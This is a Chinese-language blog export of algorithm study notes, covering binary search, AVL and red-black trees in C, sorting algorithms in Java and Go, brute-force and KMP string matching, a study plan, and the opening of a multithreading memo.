由后缀表达式构造表达式树：类似后缀表达式求值，若遇到操作数直接压栈，遇到操作符则弹出栈顶的两棵树T1,T2作为操作符的两个子女，构成一棵新的树，此树的根为操作符，并将其指针压入栈中。 二叉查找树 以整型数据为例，假设不存在重复的关键字（重复情况可以增加一个count域记录） 对于树中每个节点X，其左子树中所有关键字均小于X，右子树中所有关键字均大于X 类型声明123456789101112131415struct TreeNode&#123; int value; struct TreeNode * left; struct TreeNode * right;&#125;;#ifndef _Tree_typedef struct TreeNode * node;void MakeEmpty( node root );node Find( int x, node root );node Findmin( node root );node Findmax( node root );node Insert( int x, node root );node Delete( int x, node root );#endif 操作实现 Find（注意测试空树） 12345678910node Find( int x, node root )&#123; if ( root == NULL ) return NULL; if ( x == root-&gt;value ) return root; if ( x &lt; root-&gt;value ) return Find( x, root-&gt;left ); else return Find( x, root-&gt;right );&#125; /*这里的尾递归可以用迭代代替，但其使用的栈空间只有O(logN)*/ 递归版本的Findmin和迭代版本的Findmax 123456789101112131415node Findmin( node root )&#123; if ( root == NULL ) return NULL; else if ( root-&gt;left == NULL ) return root; else return Findmin( root-&gt;left );&#125;node Findmax( node root )&#123; if ( root != NULL ) node temp = root; while ( temp-&gt;right != NULL ) temp = temp-&gt;right; return temp;&#125; Insert 1234567891011121314151617node Insert( int x, node root )&#123; if ( root == NULL )&#123; root = malloc( sizeof ( struct TreeNode ) ); if ( root == NULL ) FatalError(\"flood\"); else&#123; root-&gt;value = x; root-&gt;left = root-&gt;right = NULL; &#125; &#125; else if ( x &lt; root-&gt;value ) root-&gt;left = Insert( x, root-&gt;left ); else if ( x &gt; root-&gt;value ) root-&gt;right = Insert( x, root-&gt;right ); /* count++ if x == root-&gt;value */ return root;&#125; Delete，若要删除的节点没有子女则直接删除，有一个子女则使用其子女将其替代，若有两个子女，则寻找其后继节点（其右子树中最左节点），使用该后继节点（此节点一定最多只有一个子女）代替要删除的节点，并删除该后继节点。当删除次数不多时，可以采用懒惰删除，被删除的节点仍留在树中，但做一个删除的标记。 1234567891011121314151617181920212223node Delete( int x, node root )&#123; if ( root == NULL ) Error(\"Empty tree\"); else if ( x &lt; root-&gt;value ) root-&gt;left = Delete( x, root-&gt;left ); else if ( x &gt; root-&gt;value ) root-&gt;right = Delete( x, root-&gt;right ); else /* Found */ if ( root-&gt;left != NULL &amp;&amp; root-&gt;right != NULL )&#123; node temp = Findmin( root-&gt;right ); root-&gt;value = temp-&gt;value; root-&gt;right = Delete( root-&gt;value, root-&gt;right ); &#125; else &#123; node temp = root; if ( root-&gt;left == NULL ) root = root-&gt;right; else root = root-&gt;left; free( temp ); &#125; return root;&#125; 平均分析 当二叉查找树不够平衡时，或者退化成一条直线时，所有操作都会成为线性开销。常用的解决办法是为二叉查找树附加一个平衡结构条件，使得任何节点的深度都不能过深。这种做法非常麻烦，并且更新树结构需要很长时间，但防止了查找树的退化。例如最老的一种平衡查找树（AVL树），红黑树，treap等。比较新的做法是splay tree（伸展树或分裂树），放弃平衡条件，允许树有任意深度，但每次操作后要对树结构调整，使后面的操作效率提高。此时对于任意单个运算无法保证O(logN)的时间复杂度，但可证明连续M次操作在最坏情形下的花费时间为O(MlogN)。 AVL树 一棵AVL树的每个节点的左子树和右子树的高度最多差1。 AVL树的平衡维护 AVL树平衡条件破坏的可能情况 在插入一个新节点之后，只有从插入点到根结点的路径上的节点可能不平衡，因为只有这些节点的子树可能发生变化。沿着这条路径上行到根并更新平衡信息，就可以找到某个平衡性被破坏的节点。假设这个平衡性被破坏的节点是X，因为任意节点最多能有两个孩子，所以高度不平衡的情况下，X的两棵子树高度差2。这种不平衡可能源于下面四种情况： 对X的左孩子的左子树进行了一次插入 对X的左孩子的右子树进行了一次插入 对X的右孩子的左子树进行了一次插入 对X的右孩子的右子树进行了一次插入 上面四种情况中，第一种和第四种是关于X的镜面对称，第二种和第三种是关于X的镜面对称。因此只需要考虑前两种情况，并拓展到后两种情况。下面对前两种情况分别分析，这两种情况的处理方法在其他平衡树中也多有使用。 对X左孩子的左子树插入。此时为（左-左）或（右-右）情况，发生在树的“外边”，可以通过一次单旋转完成调整。以下图片来源于网络。下面的两张图分别是调整第一种和第四种情况的单旋转。下面的两张图分别是两种情况的实例，上面的图是第一种情况（右旋转），下面的图为第四种情况（左旋转）。需要注意的是，当旋转修正树的部分结构时，树的其余部分必须知晓这部分变化。比如实例的第一张图中，6,7,8旋转后，5的右孩子必须指向7，来代替原来的8。 对X左孩子的右子树插入。此时为（左-右）或（右-左）情况，发生在树的“内侧”，可以通过双旋转修正。如下图所示是一个双旋转过程（图片来源于Vamei）下面两张图分别是LR旋转（针对左孩子的右子树插入）和RL旋转（针对右孩子的左子树插入）。以LR旋转为例，B节点处不满足AVL树性质，对B-C支作左旋转，使得C成为C-B支新的根，之后A-C支右旋转，使得C成为整棵树的新根，满足AVL树性质。 AVL树的代码实现 节点声明 123456789101112131415161718192021#ifndef _AvlTree_Hstruct AvlNode;typedef struct AvlNode *Position;typedef struct AvlNode *AvlTree;typedef int ElementType; /* ElementType */AvlTree MakeEmpty( AvlTree T );AvlTree Insert( ElementType x, AvlTree T );AvlTree Delete( ElementType x, AvlTree T );Position Find( ElementType x, AvlTree T );Position Findmin( AvlTree T );Position Findmax( AvlTree T );void Destroy( AvlTree T );#endif /* _AvlTree_H */struct AvlNode&#123; ElementType element; AvlTree left; AvlTree right; int height;&#125;; 功能实现（Find，Findmin和Findmax操作与二叉查找树完全相同） 获取节点高度 123456static int Height( Position P )&#123; if ( P == NULL ) return -1; else return P-&gt;height;&#125; 右旋转（针对第一种情况）和左旋转（针对第四种情况） 12345678910111213141516static Position SingleRightRotate( Position K2 )&#123; Position K1 = K2-&gt;left; K2-&gt;left = K1-&gt;right; K1-&gt;right = K2; K2-&gt;height = Max( Height( K2-&gt;left ), Height( K2-&gt;right ) ) + 1; K1-&gt;height = Max( Height( K1-&gt;left ), K2-&gt;height ) + 1; return K1; /* K1 is the new root */&#125;static Position SingleLeftRotate( Position K1 )&#123; Position K2 = K1-&gt;right; K1-&gt;right = K2-&gt;left; K2-&gt;left = K1; K1-&gt;height = Max( Height( K1-&gt;right ), Height( K1-&gt;left ) ) + 1; K2-&gt;height = Max( K1-&gt;height, Height( K2-&gt;right ) ) + 1; return K2; /* K2 is the new root */&#125; LR旋转（针对第二种情况）和RL旋转（针对第三种情况） 12345678static Position DoubleLeftRightRotate( Position K3 )&#123; K3-&gt;left = SingleLeftRotate( K3-&gt;left ); return SingleRightRotate( K3 );&#125;static Position DoubleRightLeftRotate( Position K3 )&#123; K3-&gt;right = SinglerightRotate( K3-&gt;right ); return SingleLeftRotate( K3 );&#125; 插入 12345678910111213141516171819202122232425262728293031AvlTree Insert( ElementType x, AvlTree T )&#123; if ( T == NULL )&#123; /* Empty Tree, Create a one-node tree */ T = ( AvlTree )malloc( sizeof( struct AvlNode ) ); if ( T == NULL ) FatalError( \"flood\" ); else &#123; T-&gt;element = x; T-&gt;height = 0; T-&gt;left = T-&gt;right = NULL; &#125; &#125; else if ( x &lt; T-&gt;element )&#123; T-&gt;left = Insert( x, T-&gt;left ); if ( Height( T-&gt;left ) - Height( T-&gt;right ) == 2 ) if ( x &lt; T-&gt;left-&gt;element ) T = SingleRightRotate( T ); else T = DoubleLeftRight( T ); &#125; else if ( x &gt; T-&gt;element )&#123; T-&gt;right = Insert( x, T-&gt;right ); if ( Height( T-&gt;right ) - Height( T-&gt;left ) == 2 ) if ( x &gt; T-&gt;right-&gt;element ) T = SingleLeftRotate( T ); else T = DoubleRightLeftRotate( T ); &#125; T-&gt;height = Max( Height( T-&gt;left ), Height( T-&gt;right ) ) + 1; return T;&#125; 删除（AVL树删除操作相对比较复杂，删除操作较少时可以懒惰删除减少代码编写量） 123456789101112131415161718192021222324252627282930313233343536373839404142static AvlTree Delete( ElementType x, AvlTree T )&#123; if ( T == NULL ) Error(\"Empty Tree\"); else if ( x &lt; T-&gt;element )&#123; T-&gt;left = Delete( x, T-&gt;left ); if ( Height( T-&gt;right ) - Height( T-&gt;left ) == 2)&#123; if ( T-&gt;right != NULL )&#123; if ( Height( T-&gt;right-&gt;left ) &gt; Height( T-&gt;right-&gt;right ) ) T = DoubleRightLeftRotate( T ); else T = SingleLeftRotate( T ); &#125; &#125; &#125; else if ( x &gt; T-&gt;element )&#123; T-&gt;right = Delete( x, T-&gt;right ); if ( Height( T-&gt;left ) - Height( T-&gt;right ) == 2)&#123; if ( T-&gt;left != NULL )&#123; if ( Height( T-&gt;left-&gt;right ) &gt; Height( T-&gt;left-&gt;left ) ) T = DoubleLeftRotate( T ); else T = SingleRightRotate( T ); &#125; &#125; &#125; else /* Found */ if ( T-&gt;left != NULL &amp;&amp; T-&gt;right != NULL )&#123; Position temp = Findmin( T-&gt;right ); T-&gt;value = temp-&gt;value; T-&gt;right = Delete( T-&gt;value, T-&gt;right ); &#125; else &#123; Position temp = T; if ( T-&gt;left == NULL ) T = T-&gt;right; else T = T-&gt;left; free( temp ); &#125; if ( T != NULL ) T-&gt;height = Max( Height( T-&gt;left ), Height( T-&gt;right ) ) + 1; return T; 销毁 12345678static void Destroy( AvlTree T )&#123; if ( T == NULL ) return; Destroy( T-&gt;left ); Destroy( T-&gt;right ); free( T ); T = NULL;&#125; 红黑树 红黑树也是一种二叉查找树，但在其每个节点上增加一个存储位表示节点的颜色（红或黑）。通过对节点着色的限制，可以使得红黑树没有任何一条路径可能比其他路径长两倍，因此整棵红黑树接近平衡。采用一个哨兵NIL（外节点）来代替空指针，NIL是和红黑树内普通节点有相同域的对象，其color域为BLACK，其他域可以设置为任意值。所有指向NULL的指针都将指向NIL。 红黑性质 每个节点或是红的或是黑的 根节点是黑的，每个叶节点（NIL）也是黑的 如果一个节点是红的，则它的两个子女都是黑的 对每个节点，从该节点到其子孙节点的所有路径上包含相同数目的黑色节点 一棵有n个内节点的红黑树，其高度至多为2lg(n+1)，证明使用数学归纳法。 旋转操作：insert和delete都可能使新的红黑树违反红黑性质。下图展示了左旋和右旋两种状态的切换 红黑树的代码实现 类型声明 123456789101112131415161718192021222324#ifndef _RBT_Htypedef struct RbNode * Position;typedef struct RbNode * RbTree;void LeftRotate( RbTree T, Position x );void RightRotate( RbTree T, Position x );void Insert( RbTree T, Position x );void Delete( RbTree T, Position x );void InsertFixup( RbTree T, Position x );void DeleteFixup( RbTree T, Position x );#endifenum COLOR = &#123; RED , BLACK &#125;;struct RbNode&#123; ElementType value; struct RbNode * left; struct RbNode * right; struct RbNode * parent; enum COLOR color;&#125;;struct RbNode * NIL = ( RbNode * ) malloc ( sizeof ( struct RbNode ) );struct RbNode * root = NIL;NIL-&gt;color = BLACK; 旋转操作 左旋 123456789101112131415161718192021void LeftRotate( RbTree T, Position x )&#123; if ( x == NIL || x-&gt;right == NIL ) return; Position y = x-&gt;right; y-&gt;parent = x-&gt;parent; x-&gt;right = y-&gt;left; if ( y-&gt;left != NIL ) y-&gt;left-&gt;parent = x; if ( x-&gt;parent == NIL )&#123; root = y; NIL-&gt;left = root; NIL-&gt;right = root; &#125; else &#123; if ( x == x-&gt;parent-&gt;left ) x-&gt;parent-&gt;left = y; else x-&gt;parent-&gt;right = y; &#125; y-&gt;left = x; x-&gt;parent = y;&#125; 右旋（和左旋相对应） 12345678910111213141516171819202122void RightRotate( RbTree T, Position y )&#123; if ( y == NIL || y-&gt;left == NIL ) return; Position x = y-&gt;left; x-&gt;parent = y-&gt;parent; y-&gt;left = x-&gt;right; if ( x-&gt;right != NIL ) x-&gt;right-&gt;parent = y; if ( y-&gt;parent == NIL )&#123; root = x; NIL-&gt;left = root; NIL-&gt;right = root; &#125; else &#123; if ( y == y-&gt;parent-&gt;right ) y-&gt;parent-&gt;right = x; else y-&gt;parent-&gt;left = x; &#125; x-&gt;right = y; y-&gt;parent = x;&#125; 插入操作 红黑树的插入操作时，新插入的节点默认颜色红色，因此可能破坏红黑性质共有三种情况：1.当前插入节点的父节点和叔叔节点都是红色，2.当前插入节点的父亲节点是红色，叔叔节点是黑色，插入节点是父亲节点的右孩子，3.在2中的情况，插入节点是父亲节点的左孩子。 插入代码 123456789101112131415161718192021void Insert( RbTree T, Position z )&#123; // z has already been allocated storage Position y = NIL; Position x = root; while ( x != NIL )&#123; y = x; if ( z-&gt;value &lt; x-&gt;value ) x = x-&gt;left; else x = x-&gt;right; &#125; z-&gt;parent = y; if ( y == NIL ) root = z; else if ( z-&gt;value &lt; y-&gt;value ) y-&gt;left = z; else y-&gt;right = z; z-&gt;left = z-&gt;right = NIL; z-&gt;color = RED; InsertFixup( T, z );&#125; 插入修复代码 1234567891011121314151617181920212223242526272829303132333435363738394041void InsertFixup( RbTree T, Position z )&#123; while ( z-&gt;parent-&gt;color == RED )&#123; if ( z-&gt;parent == z-&gt;parent-&gt;parent-&gt;left )&#123; Position y = z-&gt;parent-&gt;parent-&gt;right; if ( y-&gt;color == RED )&#123; // case 1 z-&gt;parent-&gt;color = BLACK; y-&gt;color = BLACK; z-&gt;parent-&gt;parent-&gt;color = RED; z = z-&gt;parent-&gt;parent; &#125; else &#123; if ( z == z-&gt;parent-&gt;right )&#123; // case 2 z = z-&gt;parent; LeftRotate( T, z ); &#125; z-&gt;parent-&gt;color = BLACK; // case 3 z-&gt;parent-&gt;parent-&gt;color = RED; RightRotate( T, z-&gt;parent-&gt;parent ); &#125; &#125; else if ( z-&gt;parent == z-&gt;parent-&gt;parent-&gt;right )&#123; Position y = z-&gt;parent-&gt;parent-&gt;left; if ( y-&gt;color == RED )&#123; z-&gt;parent-&gt;color = BLACK; y-&gt;color = BLACK; z-&gt;parent-&gt;parent-&gt;color = RED; z = z-&gt;parent-&gt;parent; &#125; else &#123; if ( z == z-&gt;parent-&gt;left )&#123; z = z-&gt;parent; RightRotate( T, z ); &#125; z-&gt;parent-&gt;color = BLACK; z-&gt;parent-&gt;parent-&gt;color = RED; LeftRotate( T, z-&gt;parent-&gt;parent ); &#125; &#125; &#125; root-&gt;color = BLACK; &#125; 删除操作 删除操作：如果被删除节点是黑色（假设它是其父节点的左孩子），可能有四种情况破坏红黑性质：1.被删除节点的兄弟节点是红色（此时父节点和兄弟节点的子节点都是黑色），2.兄弟节点是黑色且兄弟节点的两个子节点都是黑色，3.兄弟节点是黑色，兄弟节点的左孩子是红色，右孩子是黑色，4.兄弟节点是黑色，兄弟节点的右孩子是红色，左孩子颜色随意。 删除代码 123456789101112131415161718192021222324252627void Delete( RbTree T, Position z )&#123; // z has already been found Position x, y; if ( z-&gt;left == NIL || z-&gt;right == NIL ) y = z; else y = Findmin( z-&gt;right ); if ( y-&gt;left != NIL ) x = y-&gt;left; else x = y-&gt;right; x-&gt;parent = y-&gt;parent; if ( y-&gt;parent == NIL )&#123; root = x; NIL-&gt;left = root; NIL-&gt;right = root; &#125; else&#123; if ( y == y-&gt;parent-&gt;left ) x = y-&gt;parent-&gt;left; else x = y-&gt;parent-&gt;right; &#125; if ( y != z ) z-&gt;value = y-&gt;value; if ( y-&gt;color == BLACK ) DeleteFixup( T, x ); free(y);&#125; 删除恢复红黑性质代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657void DeleteFixup( RbTree T, Position x )&#123; Position w; while ( x != root &amp;&amp; x-&gt;color == BLACK )&#123; if ( x == x-&gt;parent-&gt;left )&#123; w = x-&gt;parent-&gt;right; if ( w-&gt;color == RED )&#123; // case 1 w-&gt;color = BLACK; x-&gt;parent-&gt;color = RED; LeftRotate( T, x-&gt;parent ); w = x-&gt;parent-&gt;right; &#125; else if ( w-&gt;left-&gt;color == BLACK &amp;&amp; w-&gt;right-&gt;color == BLACK )&#123; // case 2 w-&gt;color = RED; x = x-&gt;parent; &#125; else &#123; if ( w-&gt;right-&gt;color == BLACK )&#123; // case 3 w-&gt;left-&gt;color = BLACK; w-&gt;color = RED; RightRotate( T, w ); w = x-&gt;parent-&gt;right; &#125; // case 4 w-&gt;color = x-&gt;parent-&gt;color; x-&gt;parent-&gt;color = BLACK; w-&gt;right-&gt;color = BLACK; LeftRotate( T, x-&gt;parent ); x = root; &#125; &#125; else if ( x == x-&gt;parent-&gt;right )&#123; w = x-&gt;parent-&gt;left; if ( w-&gt;color == RED )&#123; w-&gt;color = BLACK; x-&gt;parent-&gt;color = RED; RightRotate( T, x-&gt;parent ); w = x-&gt;parent-&gt;left; &#125; if ( w-&gt;left-&gt;color == BLACK &amp;&amp; w-&gt;right-&gt;color == BLACK )&#123; w-&gt;color = RED; x = x-&gt;parent; &#125; else &#123; if ( w-&gt;left-&gt;color == BLACK )&#123; w-&gt;right-&gt;color = BLACK; w-&gt;color = RED; LeftRotate( T, w ); w = x-&gt;parent-&gt;left; &#125; w-&gt;color = x-&gt;parent-&gt;color; x-&gt;parent-&gt;color = BLACK; w-&gt;left-&gt;color = BLACK; RightRotate( T, x-&gt;parent ); x = root; &#125; &#125; x-&gt;color = BLACK;&#125; 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/09/08/Data-Structure-basis1/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Data-Structures","slug":"Data-Structures","permalink":"http://forec.github.io/tags/Data-Structures/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"排序和字符串匹配","slug":"Algorithms-Must","date":"2015-09-07T10:29:50.000Z","updated":"2016-11-04T15:46:00.000Z","comments":true,"path":"2015/09/07/Algorithms-Must/","link":"","permalink":"http://forec.github.io/2015/09/07/Algorithms-Must/","excerpt":"摘要 排序 字符串匹配","text":"摘要 排序 字符串匹配 排序 假定在待排序的记录序列中，存在多个具有相同的关键字的记录，若经过排序，这些记录的相对次序保持不变，即在原序列中，ri=rj，且ri在rj之前，而在排序后的序列中，ri仍在rj之前，则称这种排序算法是稳定的；否则称为不稳定的。 直接插入排序 与摸扑克牌时整理手中牌的方法相同，每次将一个新的元素插入已排序的元素中。这种方法在待排序序列基本有序的情况下效率很高。复杂度O(n^2)。是稳定的排序法。 代码（java，以整型数据升序排序为例） 12345678public static void insertSort(int []arr)&#123; for ( int i = 1 ; i &lt; arr.length ; i++ )&#123; int j, key = arr[i]; for ( j = i - 1 ; j &gt;= 0 &amp;&amp; key &lt; arr[j] ; j-- ) // only \"key &lt; arr[j]\" but not \" &lt;= \" is stable arr[j+1] = arr[j]; arr[j+1] = key; &#125;&#125; 希尔排序 希尔排序是对直接插入排序的改进，比较是希尔排序最主要的操作，而不是交换。先将整个待排元素序列分割成若干个子序列（由相隔某个“增量”的元素组成），对每个子序列进行直接插入排序，然后缩减增量再进行排序，直到整个序列中的元素基本有序（增量足够小），再对全体元素进行一次直接插入排序。此时元素基本有序，效率很高。“增量”的选择是希尔排序的重要部分，只要最终步长为1任何步长序列都可以工作（当步长为1时，算法变为插入排序，这就保证了数据一定会被排序）。已知的最好增量序列是由Sedgewick提出的(1, 5, 19, 41, 109,…)，该序列的项来自9 \\times 4^i - 9 \\times 2^i + 1和2^{i+2} \\times (2^{i+2} - 3) + 1这两个算式。用这样增量序列的希尔排序比插入排序和堆排序都要快，在小数组中速度甚至超过快速排序，但是在涉及大量数据时希尔排序还是比快速排序慢。另一个在大数组中表现优异的步长序列是斐波那契数列除去0和1将剩余的数以黄金分区比的两倍的幂进行运算得到的数列。希尔排序不是稳定的排序。 代码（java，以整型数据升序排序为例） 1234567891011public static void swap(int []arr, int l, int r)&#123; int temp = arr[l]; arr[l] = arr[r]; arr[r] = temp;&#125;public static void shellSort(int []arr) &#123; for (int gap = arr.length / 2; gap &gt; 0; gap /= 2) for (int i = gap; i &lt; arr.length; i++) for (int j = i - gap; j &gt;= 0 &amp;&amp; arr[j] &gt; arr[j + gap]; j -= gap) swap(arr,j, j + gap); &#125; 选择排序 每次从待排序的元素中选取最大（最小）的元素放到已排序序列的末尾。复杂度O(n^2)。是不稳定排序。 代码（java，以整型数据升序排序为例） 12345678910public static void selectSort(int []arr)&#123; for ( int i = 0 ; i &lt; arr.length - 1 ; i++ )&#123; int min = i; for ( int j = i + 1 ; j &lt; arr.length ; j++ ) if ( arr[j] &lt; arr[min] ) min = j; if ( min != i ) swap(arr, i, min); &#125;&#125; 冒泡排序 每次交换相邻的两个元素，若前者大于后者就交换，当第一次对全部元素完成该步骤后，最后一个元素即为最大值，对越来越少的元素重复上述步骤，直到全部数据比较完成。复杂度O(n^^2)。是稳定排序。 代码（Golang，以整型数据升序排序为例） 123456789func bubbleSort(arr []int, n int) &#123; for i := 0; i &lt; n-1; i++ &#123; for j := 0 ; j &lt; n-1-i; j++ &#123; if arr[j] &gt; arr[j+1] &#123; arr[j], arr[j+1] = arr[j+1], arr[j] &#125; &#125; &#125;&#125; 归并排序 分治思想，将待排序元素分成两份，之后对每份分别排序，排序完成后再合并成一个序列。排序过程可以递归完成，直到待排序的某个序列为单个元素即可返回。复杂度O(NlogN)。是稳定排序。 代码（java，以整型数据升序排序为例） 12345678910111213141516171819202122public static void mergeSort(int []arr, int l, int r)&#123; if ( l &lt; r )&#123; int mid = ( l + r ) &gt;&gt; 1; mergeSort(arr, l, mid); mergeSort(arr, mid+1 , r); int l1 = mid - l + 1, l2 = r - mid; int i, j; int [] L = new int[l1+1], R = new int[l2+1]; for ( i = 0; i &lt; l1 ; i++ ) L[i] = arr[l+i]; for ( j = 0; j &lt; l2 ; j++) R[j] = arr[mid+j+1]; L[l1] = R[l2] = INF; i = j = 0; for ( int k = l ; k &lt;= r ; k++)&#123; if ( L[i] &lt;= R[j] ) arr[k] = L[i++]; else arr[k] = R[j++]; &#125; &#125;&#125; 堆排序 利用二叉堆（分为最大堆/大根堆和最小堆/小根堆）管理数据，数据存储形式可以视为完全二叉树，除了最后一层的每一层都是填满的。用数组存储这个堆时，给定某个节点的下标i，其父节点Parent(i)，左孩子Left(i)和右孩子Right(i)分别为i/2，2×i和2×i+1。以最大堆为例，堆中的最大元素存放在根节点当中，在以某个节点为根的子树中，各节点的值均不小于该子树根节点的值，也就是除了根以外的每个节点都满足Parent(i).value &gt;= i.value。堆排序中通常使用最大堆，最小堆一般在构造优先队列时使用。其时间复杂度O(NlogN)，是不稳定排序。 123456789public static int Parent( int i )&#123; return i &gt;&gt; 1;&#125;public static int Left( int i )&#123; return 2 * i;&#125;public static int Right( int i )&#123; return 2 * i + 1;&#125; 堆的维护（最大堆为例），维护时自顶向下，将根节点与两个子女比较，如果满足最大堆性质则无需调整， 否则将两个子女中的较大者和根交换，此时原本以被交换的子女为根的子树可能被破坏了最大堆性质，要对该子树维护，递归即可。该操作最坏情况下的复杂度与该操作作用的节点深度有关，对于深度h的节点，复杂度O(h)。下例中的heapsize为当前堆中元素数目，i为需要维护的节点。 1234567891011public static void MaxHeapify(int []arr, int i, int heapsize)&#123; int l = Left(i), r = Right(i), largest = i; if ( l &lt;= heapsize &amp;&amp; arr[l] &gt; arr[i] ) largest = l; if ( r &lt;= heapsize &amp;&amp; arr[r] &gt; arr[largest] ) largest = r; if ( largest != i )&#123; swap(arr, i, largest); MaxHeapify(arr, largest,heapsize); &#125;&#125; 建堆（最大堆为例），对于一个序列，可以自下而上通过不断维护非叶节点构造。根据Parent(i) = i/2，可以知道长度为n的序列中前n/2个元素为非叶节点。容易理解自下向上的维护可以保证整棵树的性质成立。 1234public static void BuildHeap(int []arr)&#123; for ( int i = (arr.length-1) / 2 ; i &gt;= 1 ; i--) MaxHeapify(arr, i,arr.length-1);&#125; 排序（最大堆为例），先对待排序序列建堆，之后每次取出根节点元素（该元素为堆中剩余元素最大值），并用堆中最后一个元素代替它，再维护根节点。即每取出一个元素，堆中元素数量减一，但性质得以保持。 12345678public static void HeapSort(int[] arr)&#123; BuildHeap(arr); int heapsize = arr.length - 1; for ( int i = heapsize ; i &gt;= 2 ; i--)&#123; swap(arr, 1, i); MaxHeapify(arr, 1,--heapsize); &#125;&#125; 快速排序 快速排序同样基于分治思想，对于开始的待排序序列，选取一个“标准元素”，每个元素都和这个标准元素比较，大的放在一边，小的放在另一边。之后将这个标准元素两边（一边都比它大，一边都比它小）分别作为待排序序列重复上述操作，直到每个待排序序列为一个元素，递归结束后即为有序序列。时间复杂度O(NlogN)，为不稳定排序。快速排序用途最为广泛并且容易编写。 代码实现 12345678910111213141516public static int Partition(int []arr, int l, int r) &#123; int cmp = arr[r]; int i = l - 1; for ( int j = l ; j &lt; r ; j++ ) if ( arr[j] &lt; cmp ) swap(arr, ++i, j); swap(arr, i+1, r); return i+1;&#125;public static void QuickSort(int []arr, int l, int r)&#123; if ( l &lt; r )&#123; int mid = Partition(arr, l, r); QuickSort(arr, l, mid-1); QuickSort(arr, mid+1, r); &#125;&#125; 线性时间排序 上面的排序方法均采用比较操作，这类排序算法被称作比较排序。线性时间排序均采用非比较操作。应用不多，不介绍。 计数排序 基数排序，有链表实现的代码。 桶排序 字符串匹配 字符串匹配算法较多，暴力实现最容易编写并且效率不低，同样时间复杂度的算法还有Sunday，Robin-Karp和Bitap。相比下BF无需预处理，更容易编写。他们的时间复杂度都为O(N*M)，N为源文本长度，M为要匹配的字符串长度。 Brute Force 暴力搜索，将源文本的每个字符元作为匹配字符串的起点比较，若出现匹配则返回，否则将下一字符元作为起点。 代码（C语言。java调用indexOf或者contains方法即可） 12345678910111213141516171819202122int BruteForce( const char *source, const char *tofind ) &#123; if ( source == '\\0' || tofind == '\\0' ) return -1; if ( strlen( source ) &lt; strlen( tofind ) ) return -1; char *s = source, *p = source, *q = tofind; while ( *p != '\\0' ) &#123; if ( *p == *q )&#123; p++; q++; &#125; else&#123; p = ++s; q = tofind; &#125; if ( *q == '\\0' ) return ( p - source ) - ( q - tofind ); &#125; return -1; &#125; 比Brute Force更快捷，并且实现起来也同样简单的是KMP算法，它需要O(M)的时间用于预处理要匹配的字符串，匹配的时间复杂度只有O(N)。同样复杂度的还有Boyer Moore算法，其效率稍高，但实现复杂。KMP可以满足多数情况的需求。 KMP KMP先对要匹配的字符串预处理，当发现某个位置作为开头与源文本匹配不成功时，不会像朴素算法一样将源文本紧邻的下一个字符元作为字符串开头匹配，而是将要匹配的字符串目前匹配到的位置跳到下一个可能匹配成功的地方。 这里有一篇非常清楚、简明的文章，字符串匹配的KMP算法，很容易明白KMP的原理。 代码实现 1234567891011121314151617181920212223242526void GetNext( char * toFind ) &#123; int k = -1, j = 0; next[0] = -1; while ( j &lt; strlen( toFind ) - 1 )&#123; if ( k == -1 || toFind[k] == toFind[j] ) next[++j] = ++k; else k = next[k]; &#125;&#125;int KMP( char * source, char * toFind )&#123; int i = 0, j = 0; GetNext( toFind ); while ( i &lt; strlen( source ) )&#123; if ( j == -1 || source[i] == toFind[j] )&#123; i++; j++; &#125; else j = next[j]; if ( j == strlen( toFind ) ) return i - strlen( toFind ) + 1; &#125; return -1;&#125; 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/09/07/Algorithms-Must/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"九月计划","slug":"九月计划","date":"2015-09-07T10:00:00.000Z","updated":"2016-11-04T15:00:40.000Z","comments":true,"path":"2015/09/07/九月计划/","link":"","permalink":"http://forec.github.io/2015/09/07/九月计划/","excerpt":"小学期开始前一周没有课，十月之前也没有其它的课程，准备这段时间复习基本的数据结构和算法，主要会用C语言，部分会用java/Golang。","text":"小学期开始前一周没有课，十月之前也没有其它的课程，准备这段时间复习基本的数据结构和算法，主要会用C语言，部分会用java/Golang。 摘要 基础数据结构 #TODO: 部分高级数据结构 排序和字符串匹配 动态规划相关 图论有关 #TODO: 计算几何相关 #TODO: 数论相关 #TODO: 上面的完成了再说 基础数据结构 需求和树相关的数据结构 部分问题例程 动态规划相关 LCA和RSA 图论有关 图的概念和存储方式 图的遍历和拓扑排序 强连通分量 最小生成树和最小树形图 最短路径 最大流（一） 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/09/07/九月计划/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"Data-Structures","slug":"Data-Structures","permalink":"http://forec.github.io/tags/Data-Structures/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"多线程编程备忘","slug":"多线程编程备忘","date":"2015-08-18T01:16:02.000Z","updated":"2016-11-04T15:20:40.000Z","comments":true,"path":"2015/08/18/多线程编程备忘/","link":"","permalink":"http://forec.github.io/2015/08/18/多线程编程备忘/","excerpt":"操作系统中的进程和线程，C/C++，Java，Python中多线程的备忘","text":"操作系统中的进程和线程，C/C++，Java，Python中多线程的备忘 操作系统中的进程和线程（From CareySon）区别 操作系统中进程拥有独立的内存地址空间和一个用于控制的线程，多个线程共享进程的内存地址空间。 进程是组织资源的最小单位，线程是安排CPU执行的最小单位。 线程共享地址空间，而进程共享物理内存，打印机，键盘等资源。进程占有的资源线程占有的资源地址空间，全局变量，打开的文件，子进程，信号量，账户信息栈，寄存器，状态 ，程序计数器 线程的优势 在需要多线程互相同步或互斥的并行工作时，分解为不同的线程可以简化编程模型。 线程比进程轻量，创建和销毁的代价更小。 线程在宏观上并行，但微观上串行。当某些线程等待资源时（例如IO操作），其它线程得以继续执行，避免整个进程阻塞，提高了CPU利用率。 